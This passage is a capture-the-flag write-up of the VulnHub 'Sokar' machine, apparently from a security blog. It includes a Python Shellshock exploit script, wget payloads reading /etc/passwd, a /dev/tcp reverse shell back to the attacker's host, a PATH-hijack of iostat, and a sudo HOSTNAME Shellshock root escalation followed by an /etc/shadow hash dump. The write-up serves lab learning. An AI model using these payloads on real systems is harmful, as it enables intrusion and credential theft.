<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Sokar1/2.png"></p>

<p>Then I open iceweasel browser to have a close look at port 591.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Sokar1/3.png"></p>

<p>From the content displayed, we know the server is running system command: <code>netstat</code> and <code>iostat</code></p>

<p>From the source code, we found an URL: <code>http://10.10.10.145:591/cgi-bin/cat</code></p>

<h3>It&rsquo;s time to try shellshock (bash bug)</h3>

<p>After googled <code>shellshock</code>, I found some topics talking about how to test/exploit shellshock vulnerability in CGI. The following command is picked from <a href="http://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited">one</a> of them.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://10.10.10.145:591/cgi-bin/cat -O /temp.txt</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Sokar1/4.png"></p>

<p>It works! shellshock vulnerable. Also, two users found: <code>bynarr</code> and <code>apophis</code></p>

<p>Here I wrote a small python script to save my life.</p>

<figure class='code'><figcaption><span>sokar.py  (sokar.py)</span> <a href='http://f4l13n5n0w.github.io/downloads/code/sokar.py'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">httplib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">urllib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="n">str_usage</span> <span class="o">=</span> <span class="s">&quot;Usage: </span><span class="si">%s</span><span class="s"> &lt;command&gt;&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'><span class="n">str_example</span> <span class="o">=</span> <span class="s">&quot;Example: </span><span class="si">%s</span><span class="s"> </span><span class="se">\&quot;</span><span class="s">/bin/cat /etc/passwd</span><span class="se">\&quot;</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="n">ip</span> <span class="o">=</span> <span class="s">&quot;10.10.10.145&quot;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">591</span>
</span><span class='line'><span class="n">uri</span> <span class="o">=</span> <span class="s">&quot;/cgi-bin/cat&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">):</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">str_usage</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">str_example</span>
</span><span class='line'>  <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">exp</span> <span class="o">=</span> <span class="s">&quot;() { test;};echo </span><span class="se">\&quot;</span><span class="s">Content-type: text/plain</span><span class="se">\&quot;</span><span class="s">; echo; echo; &quot;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="c"># the following exp is used to write reverse shell code into the file /home/bynarr/iostat</span>
</span><span class='line'><span class="c">#exp = &quot;() { test;};echo \&quot;Content-type: text/plain\&quot;; echo; echo; /bin/echo -e &#39;#!/bin/bash\\n/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.131/51242 0&gt;&amp;1&#39; &gt; /home/bynarr/iostat&quot;</span>
</span><span class='line'><span class="k">print</span> <span class="n">exp</span>
</span><span class='line'><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">&quot;test&quot;</span><span class="p">:</span><span class="n">exp</span><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">conn</span> <span class="o">=</span> <span class="n">httplib</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span><span class='line'><span class="n">conn</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s">&quot;GET&quot;</span><span class="p">,</span> <span class="n">uri</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">getresponse</span><span class="p">()</span>
</span><span class='line'><span class="k">print</span> <span class="n">res</span><span class="o">.</span><span class="n">status</span><span class="p">,</span> <span class="n">res</span><span class="o">.</span><span class="n">reason</span>
</span><span class='line'>
</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'><span class="k">print</span> <span class="n">data</span>
</span><span class='line'>
</span><span class='line'><span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>by using <code>sokar.py</code> script, I poked around the system and found something interesting.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Sokar1/5.png"></p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Sokar1/6.png"></p>

<p>Here we go, I got the password (<font color="red"><em>fruity</em></font>) for user <code>bynarr</code> and notice that we only can got out to port <font color="red">51242</font> from the server.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Sokar1/7.png"></p>

<p>Another notice, <code>.</code> has been set in environment variable <code>$PATH</code>, which means when run a program the system will check the current user path first. This leave us a chance to hijack the program and make a reverse shell back to my Kali.</p>

<p>Then I changed the exp payload in my python script to write a bash script into /home/bynarr/iostat (iostat is the hijack target).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">exp</span> <span class="o">=</span> <span class="s">&quot;() { test;};echo </span><span class="se">\&quot;</span><span class="s">Content-type: text/plain</span><span class="se">\&quot;</span><span class="s">; echo; echo; /bin/echo -e &#39;#!/bin/bash</span><span class="se">\\</span><span class="s">n/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.131/51242 0&gt;&amp;1&#39; &gt; /home/bynarr/iostat&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then use my script to grant the new fake <code>iostat</code> to executable.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Sokar1/8.png"></p>

<p>Now setup <code>NC</code> on my Kali to listen on port <font color="red">51242</font>, after waiting for seconds, I got a shell with <em>bynarr</em> privilege!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nc -lvnp 51242
</span><span class='line'>listening on [any] 51242 ...
</span><span class='line'>connect to [10.10.10.131] from (UNKNOWN) [10.10.10.145] 56650
</span><span class='line'>bash: no job control in this shell
</span><span class='line'>[bynarr@sokar ~]$ id
</span><span class='line'>id
</span><span class='line'>uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
</span><span class='line'>[bynarr@sokar ~]$ pwd
</span><span class='line'>pwd
</span><span class='line'>/home/bynarr
</span><span class='line'>[bynarr@sokar ~]$ cat /proc/version
</span><span class='line'>cat /proc/version
</span><span class='line'>Linux version 2.6.32-504.1.3.el6.x86_64 (mockbuild@c6b9.bsys.dev.centos.org) (gcc version 4.4.7 20120313 (Red Hat 4.4.7-11) (GCC) ) #1 SMP Tue Nov 11 17:57:25 UTC 2014
</span><span class='line'>[bynarr@sokar ~]$ ls -al
</span><span class='line'>ls -al
</span><span class='line'>total 48
</span><span class='line'>drwxrwxrwx. 2 bynarr bynarr  4096 Jul  7 17:20 .
</span><span class='line'>drwxr-xr-x. 4 root   root    4096 Dec 30  2014 ..
</span><span class='line'>-rw-------. 1 bynarr bynarr  4982 Jul  7 17:13 .bash_history
</span><span class='line'>-rw-r--r--. 1 bynarr bynarr    18 Feb 21  2013 .bash_logout
</span><span class='line'>-rw-r--r--. 1 bynarr bynarr   178 Nov 12  2014 .bash_profile
</span><span class='line'>-rw-r--r--. 1 bynarr bynarr   124 Feb 21  2013 .bashrc
</span><span class='line'>-rwxr-xr-x  1 apache apache    61 Jul  7 16:09 iostat
</span><span class='line'>-rwxr-xr-x  1 root   root     368 Jan 27 19:14 lime
</span><span class='line'>-rw-------  1 root   root   10728 Nov 13  2014 lime.ko</span></code></pre></td></tr></table></div></figure>


<p>I run command <code>sudo -l</code> to check the allowed commands for user bynarr.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[bynarr@sokar ~]$ sudo -l
</span><span class='line'>sudo -l
</span><span class='line'>Matching Defaults entries for bynarr on this host:
</span><span class='line'>    !requiretty, visiblepw, always_set_home, env_reset, env_keep="COLORS
</span><span class='line'>    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
</span><span class='line'>    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
</span><span class='line'>    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
</span><span class='line'>    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
</span><span class='line'>    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
</span><span class='line'>    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
</span><span class='line'>
</span><span class='line'>User bynarr may run the following commands on this host:
</span><span class='line'>    (ALL) NOPASSWD: /home/bynarr/lime
</span><span class='line'>[bynarr@sokar ~]$ sudo LANG='() { :;}; /bin/bash' /home/bynarr/lime
</span><span class='line'>sudo LANG='() { :;}; /bin/bash' /home/bynarr/lime
</span><span class='line'>sudo: sorry, you are not allowed to set the following environment variables: LANG</span></code></pre></td></tr></table></div></figure>


<p>From the output, I noticed that executable program lime is owned by root but <em>bynarr</em> can run it.</p>

<p>Due to the server is vulnerable to shellshock, I use the following command (found in <a href="http://stackoverflow.com/questions/26041934/how-does-cve-2014-7169-work-breakdown-of-the-test-code">here</a>) to double check if it can be exploited locally.</p>

<p><code>env x='() { :;}; echo vulnerable' bash -c "echo this is a test"</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[bynarr@sokar ~]$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
</span><span class='line'>&lt; { :;}; echo vulnerable' bash -c "echo this is a test"                      
</span><span class='line'>vulnerable
</span><span class='line'>this is a test</span></code></pre></td></tr></table></div></figure>


<p>Yes it is vulnerable! From the previous <code>sudo -l</code> output, there are couple of environment variables can be used to exploit.</p>

<p>Here I use variable <code>HOSTNAME</code>.</p>

<p><code>sudo HOSTNAME='() { :;}; /bin/bash' /home/bynarr/lime</code></p>

<p>the password for bynarr is <code>fruity</code> which we found it before.</p>

<p>Now we get ROOT!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[bynarr@sokar ~]$ sudo HOSTNAME='() { :;}; /bin/bash' /home/bynarr/lime
</span><span class='line'>sudo HOSTNAME='() { :;}; /bin/bash' /home/bynarr/lime
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)
</span><span class='line'>python -c 'import pty; pty.spawn("/bin/bash")'
</span><span class='line'>[root@sokar bynarr]# id
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)
</span><span class='line'>[root@sokar bynarr]# pwd
</span><span class='line'>pwd
</span><span class='line'>/home/bynarr
</span><span class='line'>[root@sokar root]#cat /etc/shadow
</span><span class='line'>cat /etc/shadow
</span><span class='line'>root:$6$cWQYjirZ$rADNjUFSiHmYp.UVdt4WYlmALhMXdkg9//9yuodQ2TFfiEWlAO0J6PRKesEfvu.3dfDb.7gTGgl/jesvFWs7l0:16434:0:99999:7:::
</span><span class='line'>bin:*:15628:0:99999:7:::
</span><span class='line'>daemon:*:15628:0:99999:7:::
</span><span class='line'>adm:*:15628:0:99999:7:::
</span><span class='line'>lp:*:15628:0:99999:7:::
</span><span class='line'>sync:*:15628:0:99999:7:::
</span><span class='line'>shutdown:*:15628:0:99999:7:::
</span><span class='line'>halt:*:15628:0:99999:7:::
</span><span class='line'>mail:*:15628:0:99999:7:::
</span><span class='line'>uucp:*:15628:0:99999:7:::
</span><span class='line'>operator:*:15628:0:99999:7:::
</span><span class='line'>games:*:15628:0:99999:7:::
</span><span class='line'>gopher:*:15628:0:99999:7:::
</span><span class='line'>ftp:*:15628:0:99999:7:::
</span><span class='line'>nobody:*:15628:0:99999:7:::
</span><span class='line'>vcsa:!!:16386::::::
</span><span class='line'>saslauth:!!:16386::::::
</span><span class='line'>postfix:!!:16386::::::
</span><span class='line'>sshd:!!:16386::::::
</span><span class='line'>bynarr:$6$UVZfMym7$9FFtl9Ky3ABFGErQlpQsKNOmAycJn4MlSRVHsSgVupDstQOifqqu3LvGwf3wmBvmfvh0IslwMo4/mhZ3qnVrM/:16434:0:99999:7:::
</span><span class='line'>apache:!!:16386::::::
</span><span class='line'>apophis:$6$0HQCZwUJ$rYYSk9SeqtbKv3aEe3kz/RQdpcka8K.2NGpPveVrE5qpkgSLTtE.Hvg0egWYcaeTYau11ahsRAWRDdT8jPltH.:16434:0:99999:7:::
</span><span class='line'>[root@sokar bynarr]# cd /root
</span><span class='line'>cd /root
</span><span class='line'>[root@sokar root]# ls
</span><span class='line'>ls
</span><span class='line'>build.c  flag
</span><span class='line'>[root@sokar root]# cat flag
</span><span class='line'>cat flag
</span><span class='line'>                0   0
</span><span class='line'>                |   |
</span><span class='line'>            ____|___|____
</span><span class='line'>         0  |~ ~ ~ ~ ~ ~|   0
</span><span class='line'>         |  |   Happy   |   |
</span><span class='line'>      ___|__|___________|___|__
</span><span class='line'>      |/\/\/\/\/\/\/\/\/\/\/\/|
</span><span class='line'>  0   |    B i r t h d a y    |   0
</span><span class='line'>  |   |/\/\/\/\/\/\/\/\/\/\/\/|   |
</span><span class='line'> _|___|_______________________|___|__
</span><span class='line'>|/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/|
</span><span class='line'>|                                   |
</span><span class='line'>|     V  u  l  n  H  u  b   ! !     |
</span><span class='line'>| ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ |
</span><span class='line'>|___________________________________|
</span><span class='line'>
</span><span class='line'>=====================================
</span><span class='line'>| Congratulations on beating Sokar! |
</span><span class='line'>|                                   |
</span><span class='line'>|  Massive shoutout to g0tmi1k and  |
</span><span class='line'>| the entire community which makes  |
</span><span class='line'>|         VulnHub possible!         |
</span><span class='line'>|                                   |
</span><span class='line'>|    rasta_mouse (@_RastaMouse)     |
</span><span class='line'>=====================================</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
</feed>
